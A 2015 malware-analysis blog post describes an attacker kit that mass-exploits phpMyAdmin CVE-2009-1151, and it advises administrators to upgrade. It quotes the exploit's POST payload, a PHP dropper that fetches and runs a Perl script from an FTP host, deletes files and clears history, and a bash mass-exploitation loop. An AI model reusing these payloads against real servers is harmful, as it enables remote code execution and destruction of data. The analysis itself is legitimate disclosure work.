---
layout: post
title:  "phpMyAdmin PMA vuln CVE-2009-1151"
subtitle: "How CVE-2009-1151 is used in the wild"
date:   2015-01-17 23:34:01
category: itsec
---

Today we ([MalwareMustDie](https://twitter.com/MalwareMustDie/)) found this thread of automated exploiting phpMyAdmin instances which are                   vulnerable to [CVE-2009-1151](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1151). In short: this uses a false escaped vari                  able which can be used to run code which is then included in *config.inc.php*, see [this](http://www.gnucitizen.org/blog/cve-2009-1151-ph                  pmyadmin-remote-code-execution-proof-of-concept/) interesting blog post for additional information.

We found a pack of files that the morons used. They use a PHP script to run it in console and exploit remote systems, there a *POST* requ                  est is beeing used with a fake user agent and the exploit code:

        send_data('POST',$pma_setup_url,'action=lay_navigation&eoltype=unix&token='.$token.'&configuration='.urlencode('a:1:{i:0;O:10:"PM                  A_Config":1:{s:6:"source";s:'.strlen($ftp_code).':"'.$ftp_code.'";}}'),$pma_setup_url,$cookie_array,'Opera');

*$ftp_code* is: ```'ftp://andre:123456@87.230.10.109/fafico.ico';```, where *fafico.ico* contains that:

        <? system("cd /tmp;rm -rf *;wget ftp://sysbackup1:911911@37.228.88.214/c.pdf;perl c.pdf;curl -O
        ftp://sysbackup1:911911@37.228.88.214/c.pdf;perl c.pdf;fetch
        ftp://sysbackup1:911911@37.228.88.214/c.pdf;perl
        c.pdf;rm -rf c.pdf;history -c;");exit?>

This will download more malware and beeing executed, tried to camouflage as a PDF in a very stupid way. The FTP account work anymore, so                   I could not gain an example.
The whole files are styled ```CTRL+C CTRL+V```. The morons where even to stupid to run the files in a proper way or edit them in a proper                   way, there are dozens of tiny *.sh* scripts which just run the PHP exploit script, for example:

        #!/bin/bash
        #php exploitx.php -a $1

        for i in `cat v`
        do
        echo Il furam pe nenea de access $i
        #php exploitx.php -a $i
        command='php exploitx.php -a '$i'';
        # run $command in background, sleep for our timeout then kill the process if it is running
        echo $command
        $command &
        pid=$!
        echo "sleep 10; kill $pid" |
        wait $pid &> /dev/null
        if [ $? -eq 143 ]; then
        echo "Trecem la urmatorul 10 secs reached."
        echo
        fi

        done

Also we found there some lists of vulnerable phpMyAdmin installs. Why they are vulnerable at this time to this old CVE? Because admins ar                  e not upgrading their system. With the latest phpMyAdmin version this wont work anymore, so why not update? The IP lists contain thousand                  s of servers, they just scanned hole IP ranges. *vuln.txt* as example contains 306615 vulnerable phpMyAdmin installs! Well, many are not                   reachable but the problem keeps, many outdated phpMyAdmin installs are aviable.

Also they are downloading an [ELF malware](https://www.virustotal.com/de/file/97093a1ef729cb954b2a63d7ccc304b18d0243e2a77d87bbbb94741a029                  0d762/analysis/1421518349/) which is fairly old and known, but **not** by *ClamAV* as an example.

Also included are public PHP classes which are misused to run their evil crap, like for guessing the OS and getting details about it: [OS                  _Guess](http://pear.php.net/reference/PEAR-1.6.2/PEAR/OS_Guess.html).

Following is a list of the IP's which host their bad scripts via FTP:

- 64.40.118.113 (Library Online Inc. Canada)
- 37.228.88.214 (JSC Mediasoft ekspert Organization Russia)
- 87.230.10.109 (Hosteurope GmbH Germany)
- 202.87.31.45 (AU1 Net Pty Ltd Organization Australia)

[Here](http://pastebin.com/rsLRHWSi) you can find some gathered information and additional information about this.

Inside is also the ELF **zmeu**, [VT link](https://www.virustotal.com/de/file/686cd26d834ee527b28da7649b40f7dbd2c1917cbe0e0cfb2a1b099b97a                  066ec/analysis/).
Hashes:

- MD5: d2bca500834c158db9b39fe8748027fd
- SHA256:

                686cd26d834ee527b28da7649b40f7dbd2c1917cbe0e0cfb2a1b099b97a066ec

It's a known [vulnerability scanner](http://en.wikipedia.org/wiki/ZmEu_%28vulnerability_scanner%29) for phpMyAdmin.

Interesting is also a string I found in the file *rand*, which is used to scan the IP ranges:

        # zmeu blackhat anti-sec

So we have a name?

## Conclusion

Administrators, take care of your systems and to upgrade them in time. Outdated versions are always more risky to use than current ones.                   Please have that always in mind. And don't use simple passwords, *123456* is no password, this are just digits!
Also important: **Change** the default directory name of your phpMyAdmin install, this will prevent to be found by their automated scanne                  rs.

MalwareMustDie!
Also mentioning our brilliant **ELF** team, great work, awesome interaction and sharp chop sticks! We add the spicy in your rice!
